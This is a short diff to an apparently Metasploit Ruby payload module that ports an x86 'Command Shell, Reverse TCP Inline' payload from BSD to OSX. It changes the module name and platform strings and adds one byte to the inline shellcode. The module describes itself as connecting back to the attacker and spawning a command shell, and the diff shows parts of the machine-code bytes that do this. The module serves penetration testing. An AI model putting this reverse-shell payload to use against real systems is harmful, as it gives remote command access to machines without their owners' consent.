@@ -7,7 +7,7 @@ require 'msf/base/sessions/command_shell'
 module Msf
 module Payloads
 module Singles
-module Bsd
+module Osx
 module X86
 
 module ShellReverseTcp
@@ -16,12 +16,12 @@ module ShellReverseTcp
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'BSD Command Shell, Reverse TCP Inline',
+			'Name'          => 'OSX Command Shell, Reverse TCP Inline',
 			'Version'       => '$Revision$',
 			'Description'   => 'Connect back to attacker and spawn a command shell',
 			'Author'        => 'Ramon de Carvalho Valle <ramon[at]risesecurity.org>',
 			'License'       => MSF_LICENSE,
-			'Platform'      => 'bsd',
+			'Platform'      => 'osx',
 			'Arch'          => ARCH_X86,
 			'Handler'       => Msf::Handler::ReverseTcp,
 			'Session'       => Msf::Sessions::CommandShell,
@@ -59,6 +59,7 @@ module ShellReverseTcp
 							"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
 							"\x89\xe3"             +#   movl    %esp,%ebx                  #
 							"\x50"                 +#   pushl   %eax                       #
+							"\x54"                 +#   pushl   %esp                       #
 							"\x54"                 +#   pushl   %esp                       #
 							"\x53"                 +#   pushl   %ebx                       #
 							"\x50"                 +#   pushl   %eax                       #
